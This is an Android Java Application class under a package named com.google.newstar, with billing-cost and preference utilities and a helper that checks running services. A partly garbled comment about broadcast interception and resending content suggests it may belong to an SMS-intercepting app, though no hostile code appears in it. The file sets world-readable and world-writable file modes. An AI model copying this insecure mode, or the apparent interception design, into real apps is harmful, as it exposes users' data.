package com.google.newstar;

import java.util.List;

import com.google.utils.CostInfo;
import com.google.utils.PreferenceFile;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.Application;
import android.content.Context;
import android.content.res.Configuration;


@SuppressLint("NewApi")
public class ApplicationEx extends Application {
	public static int MODE = Context.MODE_WORLD_WRITEABLE + Context.MODE_MULTI_PROCESS+ Context.MODE_WORLD_READABLE;
	private static CostInfo costInfo;
	//广播拦截�?��二次发�?的内�?
	public  static String content;
	
	public static CostInfo getCostInfo(){
		if (costInfo==null) {
			return new CostInfo();
		}
		return costInfo;
	}
	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
	}

	@Override
	public void onCreate() {
		/*Context c = null;
		try {
			c = this.createPackageContext(PREFERENCE_PACKAGE, Context.CONTEXT_IGNORE_SECURITY);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}*/
		try {
			super.onCreate();
			PreferenceFile.init(this);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	
	@Override
	public void onLowMemory() {
		super.onLowMemory();
		System.gc();
		Runtime.getRuntime().gc();
	}

	

	@Override
	public void onTerminate() {
		super.onTerminate();
	}
	//判断service是否在运�?
	public static  boolean isServiceStarted(Context context,String PackageName){
	    boolean isStarted =false;


	    try{
	    int intGetTastCounter = 1000;


	    ActivityManager mActivityManager =
	        (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);


	    List<ActivityManager.RunningServiceInfo> mRunningService = 
	        mActivityManager.getRunningServices(intGetTastCounter);


	    for (ActivityManager.RunningServiceInfo amService : mRunningService){
	        if(0 == amService.service.getPackageName().compareTo(PackageName)){
	        isStarted = true;
	        break;
	        }
	    }
	    }catch(SecurityException e){
	    e.printStackTrace();
	    }            


	    return isStarted;                
	}

}
